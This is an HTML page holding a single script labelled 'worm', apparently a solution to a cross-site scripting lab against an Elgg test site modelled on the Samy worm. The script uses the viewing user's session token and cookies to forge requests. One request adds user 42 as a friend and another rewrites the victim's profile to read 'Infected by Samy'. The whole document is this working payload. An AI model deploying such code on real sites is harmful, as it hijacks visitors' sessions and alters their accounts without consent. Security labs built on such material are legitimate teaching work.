<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
</head>
<body>
    <script id="worm">
        var elggUser = elgg.get_logged_in_user_entity();
        if (elggUser.guid != 42) {
            var sendURL = elgg.security.addToken("http://www.xsslabelgg.com/action/friends/add?friend=42");
            var Ajax = null;
            // Construct the header information for the HTTP request
            Ajax = new XMLHttpRequest();
            Ajax.open("GET", sendURL, true);
            Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
            Ajax.setRequestHeader("Keep-Alive", "300");
            Ajax.setRequestHeader("Connection", "keep-alive");
            Ajax.setRequestHeader("Cookie", document.cookie);
            Ajax.setRequestHeader("Content-Type", "multipart/form-data");
            Ajax.send();

            Ajax = new XMLHttpRequest();
            Ajax.open("POST", "http://www.xsslabelgg.com/action/profile/edit", true);
            Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
            Ajax.setRequestHeader("Keep-Alive", "300");
            Ajax.setRequestHeader("Connection", "keep-alive");
            Ajax.setRequestHeader("Cookie", document.cookie);
            Ajax.setRequestHeader("Content-Type", "multipart/form-data");
            var content = "__elgg_token="
                    .concat(elgg.security.token.__elgg_token).concat("&__elgg_ts=")
                    .concat(elgg.security.token.__elgg_ts).concat("&name=")
                    .concat(elggUser.name).concat("&description=")
                    .concat("&accesslevel%5Bdescription%5D=2&briefdescription=Infected+by+Samy&accesslevel%" +
                            "5Bbriefdescription%5D=2&location=&accesslevel%5Blocation%5D=2&interests=&acces" +
                            "slevel%5Binterests%5D=2&skills=&accesslevel%5Bskills%5D=2&contactemail=&accessl" +
                            "evel%5Bcontactemail%5D=2&phone=&accesslevel%5Bphone%5D=2&mobile=&accesslevel%5B" +
                            "mobile%5D=2&website=&accesslevel%5Bwebsite%5D=2&twitter=&accesslevel%5Btwitter%5" +
                            "D=2&guid=").concat(elggUser.guid);
            Ajax.send(content);
        }
    </script>
</body>
</html>
